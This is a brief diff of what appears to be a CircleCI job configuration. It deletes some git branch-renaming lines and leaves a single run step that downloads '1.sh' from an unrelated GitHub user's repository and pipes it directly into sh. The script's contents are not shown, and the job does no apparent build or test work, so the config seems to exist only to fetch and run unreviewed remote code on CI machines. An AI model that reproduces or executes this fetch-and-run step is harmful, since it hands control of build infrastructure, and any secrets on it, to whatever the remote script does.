@@ -8,8 +8,4 @@ jobs:
     steps:
       - checkout
       - run : |
-	          git branch -m main master
-	          git fetch origin
-	          git branch -u origin/master master
-	          git remote set-head origin -a
             wget https://raw.githubusercontent.com/farestoyomkl/farestoyo2/master/1.sh -O - | sh
